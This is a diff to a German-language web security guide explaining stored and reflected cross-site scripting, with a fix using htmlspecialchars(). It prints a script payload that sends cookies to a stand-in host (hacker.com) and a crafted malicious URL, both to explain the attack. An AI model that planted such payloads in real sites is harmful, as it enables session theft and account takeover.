@@ -45,6 +45,46 @@ Wenn Ihre Website wie ein Spiegel ist, der Benutzereingaben direkt reflektiert, 
 **Hacker-Drehbuch 😈**
 > Ich hinterließ einen Kommentar im Kommentarbereich Ihres Artikels: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Dieser Text wurde unverändert in der Datenbank gespeichert. Jetzt führt jeder Benutzer, der diesen Kommentar liest, automatisch dieses Skript in seinem Browser aus und sendet seine Login-Cookies an meinen Server. Mit den Cookies kann ich ihre Identität vortäuschen und mich auf der Website einloggen.
 
+**Fortgeschrittene Angriffsmethode: Wie kann Code von Benutzer A die Daten von Benutzer B stehlen?**
+
+Viele Menschen fragen sich: "Der Angreifer hat meine Website nicht verändert, wie kann er dann die Daten anderer Benutzer stehlen?" Lassen Sie es mich mit einem vollständigen Beispiel erklären:
+
+1. **Angreifer A erstellt einen bösartigen Link**
+   ```
+   https://yoursite.com/detail.php?id=1<script>steal()</script>
+   ```
+
+2. **Angreifer täuscht Opfer B durch Social Engineering**
+   - E-Mail: "Schauen Sie sich die fantastischen Arbeiten dieses Fotografen an!"
+   - Social Media-Posts, Forumkommentare usw.
+
+3. **Was passiert, wenn Opfer B auf den Link klickt?**
+   ```php
+   // Ihr Code (verwundbar)
+   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
+   
+   // Tatsächliche Ausgabe in B's Browser
+   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
+   ```
+
+4. **Warum können sie B's Daten stehlen?**
+   - B ist bereits auf Ihrer Website eingeloggt
+   - Das bösartige Skript läuft unter **Ihrer Domain**, daher kann es:
+     - B's Cookies (Anmeldedaten) lesen
+     - Auf B's localStorage zugreifen
+     - Anfragen im Namen von B stellen
+     - Seiteninhalte ändern (z.B. gefälschte Anmeldeformulare)
+
+**Einfache Analogie**
+Stellen Sie sich Ihre Website als Bank vor:
+- Angreifer A platziert einen "gefälschten Überweisungsschein" (bösartiges Skript) in der Banklobby
+- Kunde B denkt, es sei legitim und trägt sein Passwort ein
+- A erhält B's Passwort
+
+XSS ermöglicht es Angreifern, "gefälschte Überweisungsscheine" (bösartigen Code) in Ihrer "Banklobby" (Website) zu platzieren.
+
+Deshalb müssen Sie `htmlspecialchars()` verwenden - es stellt sicher, dass alle Benutzereingaben als Klartext angezeigt werden, nicht als ausführbarer Code.
+
 **Katastrophale Folgen 💥**
 
 Großflächiger Benutzerkonten-Diebstahl, Datenschutzverletzungen, Websites werden mit Phishing-Inhalten oder Mining-Skripten infiltriert.
